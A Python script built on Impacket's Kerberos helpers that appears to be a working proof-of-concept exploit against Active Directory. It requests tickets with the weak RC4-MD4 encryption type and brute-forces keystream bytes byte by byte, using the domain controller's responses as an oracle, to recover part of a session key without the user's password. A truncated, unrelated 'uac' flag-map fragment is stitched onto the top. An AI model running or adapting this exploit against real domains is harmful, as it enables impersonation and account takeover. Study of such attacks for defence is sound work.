import time


def uac(val: int):
    UACMAP = {
        1       : "SCRIPT",
        1 << 1  : "ACCOUNTDISABLE",
        1 << 3  : "HOMEDIR_REQUIRED",
        1 << 4  : "LOCKOUT",
        1 << 5  : "PASSWD_NOTREQD",
        1 << 6  : "PASSWD_CANT_CHANGE",
        1 << 7  : "ENCRYPTED_TEXT_PWD_ALLOWED",
        1 << 8  : "TEMP_DUPLICATE_ACCOUNT",
        1 << 9  : "NORMAL_ACCOUNT",
        0x0800  : "INTERDOMAIN_TRUST_ACCOUNT",
        0x1000  : "WORKSTATION_TRUST_ACCOUNT",
        0x2000  : "SERVER_TRUST_ACCOUNT",
        0x10000 : "DONT_EXPIRE_PASSWORD",
        0x20000 : "MNS_LOGON_ACCOUNT",
    }


# Impacket - Collection of Python classes for working with network protocols.
#
# SECUREAUTH LABS. Copyright (C) 2022 SecureAuth Corporation. All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   Helper functions for kerberos
#   Just starting, TONS of things to do
#   In fact, make it easier
#
# Author:
#   Alberto Solino (@agsolino)
#

import datetime
import random
import socket
import struct

from pyasn1.codec.der import decoder, encoder
from pyasn1.error import PyAsn1Error
from pyasn1.type.univ import noValue, Sequence
from pyasn1.type.useful import GeneralizedTime
from six import b
from binascii import unhexlify, hexlify

from impacket.krb5.asn1 import AS_REQ, AP_REQ, TGS_REQ, KERB_PA_PAC_REQUEST, KRB_ERROR, PA_ENC_TS_ENC, AS_REP, TGS_REP, \
    EncryptedData, Authenticator, EncASRepPart, EncTGSRepPart, seq_set, seq_set_iter, KERB_ERROR_DATA, METHOD_DATA, \
    ETYPE_INFO2, ETYPE_INFO, AP_REP, EncAPRepPart, HostAddresses, HostAddress
from impacket.krb5.types import KerberosTime, Principal, Ticket
from impacket.krb5.gssapi import CheckSumField, GSS_C_DCE_STYLE, GSS_C_MUTUAL_FLAG, GSS_C_REPLAY_FLAG, \
    GSS_C_SEQUENCE_FLAG, GSS_C_CONF_FLAG, GSS_C_INTEG_FLAG
from impacket.krb5 import constants
from impacket.krb5.crypto import Key, _enctype_table, InvalidChecksum
from impacket.smbconnection import SessionError
from impacket.spnego import SPNEGO_NegTokenInit, TypesMech, SPNEGO_NegTokenResp, ASN1_OID, asn1encode, ASN1_AID
from impacket.krb5.gssapi import KRB5_AP_REQ
from impacket import nt_errors, LOG
from impacket.krb5.ccache import CCache

# Our random number generator
try:
    rand = random.SystemRandom()
except NotImplementedError:
    rand = random
    pass


def sendReceive(data, host, kdcHost):
    if kdcHost is None:
        targetHost = host
    else:
        targetHost = kdcHost

    messageLen = struct.pack('!i', len(data))

    LOG.debug('Trying to connect to KDC at %s' % targetHost)
    try:
        af, socktype, proto, canonname, sa = socket.getaddrinfo(targetHost, 88, 0, socket.SOCK_STREAM)[0]
        s = socket.socket(af, socktype, proto)
        s.connect(sa)
    except socket.error as e:
        raise socket.error("Connection error (%s:%s)" % (targetHost, 88), e)

    s.sendall(messageLen + data)

    recvDataLen = struct.unpack('!i', s.recv(4))[0]

    r = s.recv(recvDataLen)
    while len(r) < recvDataLen:
        r += s.recv(recvDataLen - len(r))

    try:
        krbError = KerberosError(packet=decoder.decode(r, asn1Spec=KRB_ERROR())[0])
    except:
        return r

    if krbError.getErrorCode() != constants.ErrorCodes.KDC_ERR_PREAUTH_REQUIRED.value:
        try:
            for i in decoder.decode(r):
                if type(i) == Sequence:
                    for k in vars(i)["_componentValues"]:
                        if type(k) == GeneralizedTime:
                            server_time = datetime.datetime.strptime(k.asOctets().decode("utf-8"), "%Y%m%d%H%M%SZ")
                            LOG.debug("Server time (UTC): %s" % server_time)
        except:
            # Couldn't get server time for some reason
            pass
        raise krbError

    return r


def encodeLength(value, length:int):
        if (value < 0):
            raise
        if (length == 0):
            return value.to_bytes(1, 'big')
        if (length == 1):
            return  b'\x81' + value.to_bytes(1, 'big')
        if (length == 2):
            return  b'\x82' + value.to_bytes(2, 'big')
        if (length == 3):
            return b'\x83' + value.to_bytes(3, 'big')
        return b'\x84' + value.to_bytes(4, 'big')


def buildTimestampBytes(prifix_len:int, add_null_char:bool, ks):
    timeStamp = PA_ENC_TS_ENC()

    now = datetime.datetime.utcnow()
    timeStamp['patimestamp'] = KerberosTime.to_asn1(now)
    # timeStamp['pausec'] = now.microsecond

    # Encrypt the shyte
    encodedTimeStamp = encoder.encode(timeStamp)
    if add_null_char:
        encodedTimeStamp += b'\x00'
    print(encodeLength(len(encodedTimeStamp), prifix_len) + encodedTimeStamp)
    ret = b'\x00' * 0x18 + b'\x30' + encodeLength(len(encodedTimeStamp), prifix_len) + encodedTimeStamp
    ret2 = []
    print(ret)
    print(len(ret))
    for i1, i2 in zip(ks, ret):
        ret2.append(int.to_bytes(i1^i2, 1, 'little'))

    print(b''.join(ret2).hex())
    print(len(ret2))
    return ret2
    # Key Usage 1
    # AS-REQ PA-ENC-TIMESTAMP padata timestamp, encrypted with the
    # client key (Section 5.2.7.2)
    # encriptedTimeStamp = cipher.encrypt(key, 1, encodedTimeStamp, None)
    #
    # encryptedData = EncryptedData()
    # encryptedData['etype'] = cipher.enctype
    # encryptedData['cipher'] = encriptedTimeStamp
    # encodedEncryptedData = encoder.encode(encryptedData)

class SessionKeyDecryptionError(Exception):
    """
    Exception risen when we fail to decrypt a session key within an AS-REP
    message.
    It provides context information such as full AS-REP message but also the
    cipher, key and cipherText used when the error occurred.
    """

    def __init__(self, message, asRep, cipher, key, cipherText):
        self.message = message
        self.asRep = asRep
        self.cipher = cipher
        self.key = key
        self.cipherText = cipherText

    def __str__(self):
        return "SessionKeyDecryptionError: %s" % self.message


class KerberosError(SessionError):
    """
    This is the exception every client should catch regardless of the underlying
    SMB version used. We'll take care of that. NETBIOS exceptions are NOT included,
    since all SMB versions share the same NETBIOS instances.
    """

    def __init__(self, error=0, packet=0):
        SessionError.__init__(self)
        self.error = error
        self.packet = packet
        if packet != 0:
            self.error = self.packet['error-code']

    def getErrorCode(self):
        return self.error

    def getErrorPacket(self):
        return self.packet

    def getErrorString(self):
        return constants.ERROR_MESSAGES[self.error]

    def __str__(self):
        retString = 'Kerberos SessionError: %s(%s)' % (constants.ERROR_MESSAGES[self.error])
        try:
            # Let's try to get the NT ERROR, if not, we quit and give the general one
            if self.error == constants.ErrorCodes.KRB_ERR_GENERIC.value:
                eData = decoder.decode(self.packet['e-data'], asn1Spec=KERB_ERROR_DATA())[0]
                nt_error = struct.unpack('<L', eData['data-value'].asOctets()[:4])[0]
                retString += '\nNT ERROR: %s(%s)' % (nt_errors.ERROR_MESSAGES[nt_error])
        except:
            pass

        return retString

def tsGen(key_stream, zero_count):
    timeStamp = PA_ENC_TS_ENC()

    now = datetime.datetime.utcnow()
    timeStamp['patimestamp'] = KerberosTime.to_asn1(now) + '\x00' * zero_count

    # Encrypt the shyte
    encodedTimeStamp = encoder.encode(timeStamp)

    encodedTimeStamp = b'\x00' * 0x18 + encodedTimeStamp
    # 利用ks加密
    encriptedTimeStamp = b''.join((i1 ^ i2).to_bytes(1, 'big') for i1, i2 in zip(encodedTimeStamp, key_stream))
    # Key Usage 1
    # AS-REQ PA-ENC-TIMESTAMP padata timestamp, encrypted with the
    # client key (Section 5.2.7.2)

    encryptedData = EncryptedData()
    encryptedData['etype'] = -128
    encryptedData['cipher'] = encriptedTimeStamp
    encodedEncryptedData = encoder.encode(encryptedData)

    return encodedEncryptedData

def getPATGT(user, domain, kdc=None):
    asReq = AS_REQ()

    domain = domain.upper()
    serverName = Principal('krbtgt/%s' % domain, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
    clientName = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

    pacRequest = KERB_PA_PAC_REQUEST()
    pacRequest['include-pac'] = True
    encodedPacRequest = encoder.encode(pacRequest)

    asReq['pvno'] = 5
    asReq['msg-type'] = int(constants.ApplicationTagNumbers.AS_REQ.value)

    asReq['padata'] = noValue
    asReq['padata'][0] = noValue
    asReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
    asReq['padata'][0]['padata-value'] = encodedPacRequest

    reqBody = seq_set(asReq, 'req-body')

    opts = list()
    opts.append(constants.KDCOptions.forwardable.value)
    opts.append(constants.KDCOptions.renewable.value)
    opts.append(constants.KDCOptions.proxiable.value)
    reqBody['kdc-options'] = constants.encodeFlags(opts)

    seq_set(reqBody, 'sname', serverName.components_to_asn1)
    seq_set(reqBody, 'cname', clientName.components_to_asn1)

    if domain == '':
        raise Exception('Empty Domain not allowed in Kerberos')

    reqBody['realm'] = domain

    now = datetime.datetime.utcnow()
    reqBody['till'] = KerberosTime.to_asn1(now)
    reqBody['rtime'] = KerberosTime.to_asn1(now)
    reqBody['nonce'] = rand.getrandbits(31)

    reqBody['addresses'] = noValue
    reqBody['addresses'][0]['addr-type'] = 20
    reqBody['addresses'][0]['address'] = 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'

    supportedCiphers = (-128,)

    seq_set_iter(reqBody, 'etype', supportedCiphers)

    message = encoder.encode(asReq)


    r = sendReceive(message, domain, kdc)

    asRep = decoder.decode(r, asn1Spec=AS_REP())[0]

    # print(asRep['enc-part']['etype'])
    cipher = asRep['enc-part']['cipher']

    dec_len = len(cipher) - 0x18
    l1 = dec_len - 4
    l2 = dec_len - 8

    enc_session_key_5bytes = cipher[0x18 + 0x15: 0x18 + 0x15 + 5]
    enc_session_key_5bytes_ks = []
    # print(l1, l2)
    key_stream = [0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                  0x79, 0x82, 0xFF, 0xFF, 0x30, 0x82, 0xFF, 0xFF,
                  0xA0, 0x1B, 0x30, 0x19, 0xA0, 0x03, 0x02, 0x01,
                  0x80, 0xA1, 0x12, 0x04, 0x10]
    # print(l1.to_bytes(2, 'big').split(''))
    key_stream[26], key_stream[27] = l1.to_bytes(2, 'big')
    key_stream[30], key_stream[31] = l2.to_bytes(2, 'big')

    # 计算ks
    for i in range(len(key_stream)):
        key_stream[i] ^= cipher[i]
    # ks
    # print(key_stream)

    # 利用AS_REQ验证ks
    for n in range(1,6):
        # print('ks_len: ', len(key_stream))
        for i in range(256):
            key_stream.append(i)
            encodedTS = tsGen(key_stream, n)

            asReq['padata'] = noValue
            asReq['padata'][0] = noValue
            asReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_ENC_TIMESTAMP.value)
            asReq['padata'][0]['padata-value'] = encodedTS

            asReq['padata'][1] = noValue
            asReq['padata'][1]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
            asReq['padata'][1]['padata-value'] = encodedPacRequest
            message = encoder.encode(asReq)
            try:
                r = sendReceive(message, domain, kdc)
                key_stream.append(i)
                # break
                enc_session_key_5bytes_ks.append(i)
                print('[+]keystream byte found:',i)
                break
            except:
                pass
            finally:
                key_stream.pop()
        # asRep = decoder.decode(r, asn1Spec=AS_REP())[0]

    # print(key_stream)

    session_key = b''.join([(i1^i2).to_bytes(1, 'big') for i1, i2 in zip(enc_session_key_5bytes, enc_session_key_5bytes_ks)]) + b'\xab'*11
    print(f'[+] session_key is: {session_key.hex()}')
    # for i in range(256):
    #     key_stream.append(i)
    #     tsGen()



if __name__ == '__main__':
    t_start = time.time()
    getPATGT('aaa', 'test16.local')
    t_end = time.time()

    print(f'[+] time costs {t_end - t_start}s')
